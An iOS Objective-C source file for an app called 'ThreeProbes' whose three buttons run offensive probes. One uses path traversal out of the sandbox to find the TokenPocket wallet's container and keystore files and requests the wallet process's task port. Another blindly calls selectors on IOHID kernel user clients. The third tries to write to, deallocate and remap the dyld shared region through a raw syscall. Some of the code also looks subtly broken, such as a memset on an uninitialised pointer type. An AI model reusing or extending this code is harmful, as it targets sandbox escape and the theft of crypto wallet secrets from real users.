//
//  ViewController.m — ThreeProbes
//  TP Wallet Direct | IOHID Deep Probe | Rie NONAUTH Carrier
//

#import "ViewController.h"
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <mach/vm_map.h>
#import <IOKit/IOKitLib.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <objc/runtime.h>

// ── API wrappers (all dlsym'd for iOS SDK compat) ──
typedef kern_return_t (*MachVMRegionRecurseFn)(vm_map_t, mach_vm_address_t *,
    mach_vm_size_t *, natural_t *, vm_region_recurse_info_t, mach_msg_type_number_t *);
typedef kern_return_t (*MachVMReadOverwriteFn)(vm_map_t, mach_vm_address_t,
    mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);

@interface ViewController ()
@property (nonatomic, strong) UIButton *tpWalletButton;
@property (nonatomic, strong) UIButton *iohidDeepButton;
@property (nonatomic, strong) UIButton *rieNonauthButton;
@property (nonatomic, strong) UITextView *logView;
@end

@implementation ViewController

// ── Log helper ──
- (void)appendLog:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSDateFormatter *df = [[NSDateFormatter alloc] init];
        df.dateFormat = @"HH:mm:ss.SSS";
        NSString *ts = [df stringFromDate:[NSDate date]];
        NSString *line = [NSString stringWithFormat:@"[%@] %@\n", ts, msg];
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange bottom = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:bottom];
    });
}

// ── Button setup ──
- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor systemBackgroundColor];

    self.tpWalletButton = [self makeBtn:@"TP Wallet Direct (v1)" color:[UIColor systemYellowColor] action:@selector(tpWalletTapped)];
    self.iohidDeepButton = [self makeBtn:@"IOHID Deep Probe (v1)" color:[UIColor systemBrownColor] action:@selector(iohidDeepTapped)];
    self.rieNonauthButton = [self makeBtn:@"Rie NONAUTH Carrier (v1)" color:[UIColor systemRedColor] action:@selector(rieNonauthTapped)];

    self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11.0 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
    self.logView.text = @"ThreeProbes v1\n";
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [self.tpWalletButton.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [self.tpWalletButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.tpWalletButton.widthAnchor constraintGreaterThanOrEqualToConstant:240],
        [self.iohidDeepButton.topAnchor constraintEqualToAnchor:self.tpWalletButton.bottomAnchor constant:10],
        [self.iohidDeepButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.iohidDeepButton.widthAnchor constraintGreaterThanOrEqualToConstant:240],
        [self.rieNonauthButton.topAnchor constraintEqualToAnchor:self.iohidDeepButton.bottomAnchor constant:10],
        [self.rieNonauthButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.rieNonauthButton.widthAnchor constraintGreaterThanOrEqualToConstant:240],
        [self.logView.topAnchor constraintEqualToAnchor:self.rieNonauthButton.bottomAnchor constant:16],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:8],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-8],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-8],
    ]];
}

- (UIButton *)makeBtn:(NSString *)title color:(UIColor *)color action:(SEL)action {
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    btn.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *cfg = [UIButtonConfiguration filledButtonConfiguration];
    cfg.baseBackgroundColor = color;
    btn.configuration = cfg;
    [btn setTitle:title forState:UIControlStateNormal];
    [btn addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btn];
    return btn;
}

// ════════════════════════════════════════════════════════════════
// Probe 1: TP Wallet Direct
// ════════════════════════════════════════════════════════════════
- (void)tpWalletTapped {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self appendLog:@"\n═══ TP Wallet Direct v1 ═══"];
        NSString *p24 = @"../../../../../../../../../../../../..";
        NSFileManager *fm = [NSFileManager defaultManager];
        NSMutableString *log = [NSMutableString string];

        // Phase 1: find TP's data container via metadata plists
        [log appendString:@"── Phase 1: container search ──\n"];
        NSArray *tpCands = @[
            @"com.tokenpocket.tokenpocket", @"com.tptokenpocket.tokenpocket",
            @"org.tokenpocket.wallet", @"io.tokenpocket.TokenPocket",
            @"com.tokenpokcet.tokenpocket",
        ];
        NSString *appRoot = [[p24 stringByAppendingString:
            @"var/mobile/Containers/Data/Application"] stringByExpandingTildeInPath];
        NSArray *dirs = [fm contentsOfDirectoryAtPath:appRoot error:nil];
        [log appendFormat:@"  containers: %lu dirs\n", (unsigned long)dirs.count];

        for (NSString *uuid in dirs) {
            if (uuid.length < 10) continue;
            NSString *mp = [NSString stringWithFormat:@"%@/%@/.com.apple.mobile_container_manager.metadata.plist",
                appRoot, uuid];
            NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:mp];
            NSString *bid = meta[@"MCMMetadataIdentifier"];
            if (!bid) continue;
            for (NSString *cand in tpCands) {
                if ([bid rangeOfString:cand options:NSCaseInsensitiveSearch].location != NSNotFound) {
                    [log appendFormat:@"  *** FOUND TP: %@\n    path: %@/%@\n", bid, appRoot, uuid];
                    NSString *docs = [NSString stringWithFormat:@"%@/%@/Documents", appRoot, uuid];
                    for (NSString *f in ([fm contentsOfDirectoryAtPath:docs error:nil] ?: @[])) {
                        [log appendFormat:@"    Documents/%@\n", f];
                    }
                    NSArray *wfiles = @[@"wallet", @"keystore", @"keyinfo", @"wallet_data", @"wallet.json", @"wallets", @"data"];
                    for (NSString *wf in wfiles) {
                        for (NSString *sub in @[wf, [@"Library/" stringByAppendingString:wf]]) {
                            NSString *fp = [NSString stringWithFormat:@"%@/%@/%@", appRoot, uuid, sub];
                            BOOL isDir = NO;
                            if ([fm fileExistsAtPath:fp isDirectory:&isDir])
                                [log appendFormat:@"    exists: %@ (dir=%d)\n", sub, isDir];
                        }
                    }
                }
            }
        }

        // Phase 2: running TP process
        [log appendString:@"── Phase 2: process scan ──\n"];
        int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
        size_t len = 0;
        sysctl(mib, 4, NULL, &len, NULL, 0);
        struct kinfo_proc *procs = (struct kinfo_proc *)malloc(len);
        if (procs && sysctl(mib, 4, procs, &len, NULL, 0) == 0) {
            int cnt = (int)(len / sizeof(struct kinfo_proc));
            for (int i = 0; i < cnt; i++) {
                NSString *nm = [NSString stringWithUTF8String:procs[i].kp_proc.p_comm];
                if ([nm rangeOfString:@"token" options:NSCaseInsensitiveSearch].location != NSNotFound ||
                    [nm rangeOfString:@"pocket" options:NSCaseInsensitiveSearch].location != NSNotFound) {
                    pid_t pid = procs[i].kp_proc.p_pid;
                    [log appendFormat:@"  PROCESS: %@ pid=%d\n", nm, pid];
                    task_t tp = MACH_PORT_NULL;
                    kern_return_t kr = task_for_pid(mach_task_self(), pid, &tp);
                    [log appendFormat:@"    task_for_pid: kr=%d (0=ok, 5=denied)\n", kr];
                    if (kr == KERN_SUCCESS && tp != MACH_PORT_NULL) {
                        [log appendString:@"    *** GOT TASK PORT! ***\n"];
                        // Could dump memory here
                        mach_port_deallocate(mach_task_self(), tp);
                    }
                }
            }
        }
        free(procs);

        // Phase 3: URL scheme
        [log appendString:@"── Phase 3: URL schemes ──\n"];
        for (NSString *s in @[@"tokenpocket://", @"tp://", @"tpocket://", @"tokenpocketpro://"]) {
            BOOL ok = [[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:s]];
            [log appendFormat:@"  %@ → %@\n", s, ok ? @"YES" : @"NO"];
        }

        [self appendLog:log];
        [self appendLog:@"═══ TP Wallet Direct v1 Done ═══"];
    });
}

// ════════════════════════════════════════════════════════════════
// Probe 2: IOHID Deep Probe
// ════════════════════════════════════════════════════════════════
- (void)iohidDeepTapped {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self appendLog:@"\n═══ IOHID Deep Probe v1 ═══"];
        NSMutableString *log = [NSMutableString string];
        kern_return_t kr;

        // Enumerate all IOHIDFamily services
        [log appendString:@"── Phase 1: IOHIDFamily services ──\n"];
        CFMutableDictionaryRef m1 = IOServiceMatching("IOHIDFamily");
        io_iterator_t it1 = IO_OBJECT_NULL;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m1, &it1) == KERN_SUCCESS) {
            io_object_t svc; int n = 0;
            while ((svc = IOIteratorNext(it1)) != IO_OBJECT_NULL) {
                io_name_t nm; IORegistryEntryGetName(svc, nm);
                [log appendFormat:@"  [%d] %s\n", n++, nm]; IOObjectRelease(svc);
            }
            IOObjectRelease(it1);
        }

        // Enumerate IOHIDEventService and try opening UserClients
        [log appendString:@"── Phase 2: IOHIDEventService scan ──\n"];
        CFMutableDictionaryRef m2 = IOServiceMatching("IOHIDEventService");
        io_iterator_t it2 = IO_OBJECT_NULL;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m2, &it2) == KERN_SUCCESS) {
            io_object_t es; int idx = 0;
            while ((es = IOIteratorNext(it2)) != IO_OBJECT_NULL && idx < 20) {
                io_name_t nm; IORegistryEntryGetName(es, nm);
                [log appendFormat:@"  [%d] %s\n", idx, nm];
                io_connect_t conn = IO_OBJECT_NULL;
                kr = IOServiceOpen(es, mach_task_self(), 0, &conn);
                if (kr == KERN_SUCCESS && conn != IO_OBJECT_NULL) {
                    [log appendFormat:@"    type=0 OK conn=%d\n", conn];
                    for (int sel = 0; sel < 32; sel++) {
                        uint64_t out[8] = {0}; size_t outCnt = 1;
                        kr = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0,
                            out, &outCnt, NULL, NULL);
                        if (kr == 0)
                            [log appendFormat:@"    sel%d: ok out[0]=0x%llx\n", sel, out[0]];
                    }
                    IOServiceClose(conn);
                } else {
                    [log appendFormat:@"    type=0 fail: 0x%x\n", kr];
                }
                idx++; IOObjectRelease(es);
            }
            IOObjectRelease(it2);
        }

        // FastPathUserClient with different types
        [log appendString:@"── Phase 3: FastPathUserClient ──\n"];
        CFMutableDictionaryRef m3 = IOServiceMatching("IOHIDEventServiceFastPathUserClient");
        io_iterator_t it3 = IO_OBJECT_NULL;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m3, &it3) == KERN_SUCCESS) {
            io_object_t fps; int fi = 0;
            while ((fps = IOIteratorNext(it3)) != IO_OBJECT_NULL && fi < 5) {
                io_name_t nm; IORegistryEntryGetName(fps, nm);
                [log appendFormat:@"  [%d] %s\n", fi, nm];
                for (int ty = 0; ty < 8; ty++) {
                    io_connect_t fc = IO_OBJECT_NULL;
                    kr = IOServiceOpen(fps, mach_task_self(), ty, &fc);
                    if (kr == KERN_SUCCESS && fc != IO_OBJECT_NULL) {
                        [log appendFormat:@"    type=%d OK conn=%d\n", ty, fc];
                        for (int sel = 0; sel < 16; sel++) {
                            uint64_t in[8] = {0}; uint64_t out[8] = {0};
                            size_t oc = 1;
                            kr = IOConnectCallMethod(fc, sel, in, 1, NULL, 0, out, &oc, NULL, NULL);
                            if (kr == 0)
                                [log appendFormat:@"      sel%d: ok out[0]=0x%llx\n", sel, out[0]];
                        }
                        IOServiceClose(fc);
                    }
                }
                fi++; IOObjectRelease(fps);
            }
            IOObjectRelease(it3);
        }

        [self appendLog:log];
        [self appendLog:@"═══ IOHID Deep Probe v1 Done ═══"];
    });
}

// ════════════════════════════════════════════════════════════════
// Probe 3: Rie NONAUTH Carrier
// ════════════════════════════════════════════════════════════════
- (void)rieNonauthTapped {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self appendLog:@"\n═══ Rie NONAUTH Carrier v1 ═══"];

        MachVMRegionRecurseFn vrr = dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
        MachVMReadOverwriteFn vro = dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
        kern_return_t (*vmw)(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t) =
            dlsym(RTLD_DEFAULT, "mach_vm_write");
        long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");

        if (!vrr || !vro || !vmw || !sc) {
            [self appendLog:@"!! missing vm_* or syscall functions"]; return;
        }

        #define SR_BASE 0x180000000ULL
        #define SR_LIMIT (SR_BASE + 0x84000000ULL)
        NSMutableString *log = [NSMutableString string];
        [log appendString:@"── Scanning shared region for NONAUTH RW carriers ──\n"];

        mach_vm_address_t walk = SR_BASE;
        mach_vm_size_t segSize = 0;
        natural_t segDepth = 1;
        int found = 0;

        for (int si = 0; si < 80; si++) {
            vm_region_recurse_info_t info; memset(info, 0, sizeof(info));
            mach_msg_type_number_t cnt = sizeof(info) / sizeof(natural_t);
            if (vrr(mach_task_self(), &walk, &segSize, &segDepth, info, &cnt) != KERN_SUCCESS) break;
            if (walk >= SR_LIMIT) break;
            if (segSize < 0x4000) { walk += segSize; continue; }

            uint8_t buf[4096]; mach_vm_size_t outSz = 0;
            if (vro(mach_task_self(), walk, 4096, (mach_vm_address_t)(uintptr_t)buf, &outSz) != KERN_SUCCESS) {
                walk += segSize; continue;
            }
            if (memcmp(buf, "dyld_v1", 7) != 0) { walk += segSize; continue; }

            uint32_t mo = *(uint32_t*)(buf + 0x138);
            uint32_t mc = *(uint32_t*)(buf + 0x13c);
            if (mc == 0 || mc > 64) { walk += segSize; continue; }

            uint8_t fbuf[0x10000]; mach_vm_size_t fs = 0;
            if (vro(mach_task_self(), walk, sizeof(fbuf), (mach_vm_address_t)(uintptr_t)fbuf, &fs) != KERN_SUCCESS) {
                walk += segSize; continue;
            }

            for (uint32_t mi = 0; mi < mc && found < 10; mi++) {
                uint8_t *mws = fbuf + mo + mi * 32;
                uint64_t ma = *(uint64_t*)(mws + 0);
                uint64_t ms = *(uint64_t*)(mws + 8);
                uint32_t fl = *(uint32_t*)(mws + 24);
                uint32_t mx = *(uint32_t*)(mws + 28);
                uint32_t ini = *(uint32_t*)(mws + 30);

                if ((fl & 0x40) || mx != 3 || ms < 0x1000) continue; // skip auth/non-RW/small

                found++;
                [log appendFormat:@"\nNONAUTH[%d]: a=0x%llx sz=0x%llx fl=0x%x p=%d/%d\n", found, ma, ms, fl, mx, ini];

                // Read content
                uint8_t cb[256]; mach_vm_size_t cs = 0;
                if (vro(mach_task_self(), ma, sizeof(cb), (mach_vm_address_t)(uintptr_t)cb, &cs) == KERN_SUCCESS) {
                    [log appendFormat:@"  read: %02x%02x%02x%02x%02x%02x%02x%02x...\n",
                        cb[0],cb[1],cb[2],cb[3],cb[4],cb[5],cb[6],cb[7]];
                }

                // Try vm_write
                uint8_t mk[8] = {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x11};
                kern_return_t kw = vmw(mach_task_self(), ma, (vm_offset_t)mk, 8);
                [log appendFormat:@"  vm_write: kr=%d\n", kw];
                if (kw == KERN_SUCCESS) {
                    uint8_t vb[8]; mach_vm_size_t vs = 0;
                    if (vro(mach_task_self(), ma, 8, (mach_vm_address_t)(uintptr_t)vb, &vs) == KERN_SUCCESS)
                        [log appendFormat:@"  verify: %02x%02x%02x%02x%02x%02x%02x%02x\n",
                            vb[0],vb[1],vb[2],vb[3],vb[4],vb[5],vb[6],vb[7]];
                }

                // Try vm_deallocate
                kern_return_t kd = vm_deallocate(mach_task_self(), ma, ms);
                [log appendFormat:@"  vm_dealloc: kr=%d\n", kd];
                if (kd == KERN_SUCCESS) {
                    uint8_t aft[32]; mach_vm_size_t as = 0;
                    kern_return_t kr2 = vro(mach_task_self(), ma, sizeof(aft),
                        (mach_vm_address_t)(uintptr_t)aft, &as);
                    [log appendFormat:@"  after dealloc read: kr=%d\n", kr2];

                    // Try in-memory remap (nf=0 means no file, just remap from memory)
                    struct { uint64_t a, s, fo, ss, st; uint32_t mxp, inp; } rm =
                        {ma, ms, 0, 0, 0, mx, ini};
                    long r = sc(536, 0, NULL, 1, &rm);
                    [log appendFormat:@"  sc(536,nf=0,nm=1): ret=%ld errno=%d\n", r, errno);
                }
            }
            walk += segSize;
        }
        [log appendFormat:@"\n  total NONAUTH RW: %d\n", found];

        [self appendLog:log];
        [self appendLog:@"═══ Rie NONAUTH Carrier v1 Done ═══"];
    });
}

@end
